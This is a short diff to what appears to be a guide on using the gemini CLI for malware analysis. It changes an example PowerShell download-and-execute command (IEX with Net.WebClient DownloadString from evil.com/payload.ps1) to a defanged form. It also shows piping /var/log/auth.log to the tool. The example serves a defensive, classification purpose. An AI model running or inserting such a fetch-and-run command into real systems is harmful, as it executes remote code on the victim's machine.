@@ -176,7 +176,7 @@ gemini --system "You are a security analyst specializing in malware analysis"
 
 ```bash
 # Quick analysis
-gemini "What MITRE ATT&CK techniques does this PowerShell command use: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
+gemini "What MITRE ATT&CK techniques does this PowerShell command use: IEX (New-Object Net.WebClient).DownloadString('hxxp://evil[.]com/payload.ps1')"
 
 # File analysis
 gemini "Analyze this log file for suspicious activity" < /var/log/auth.log
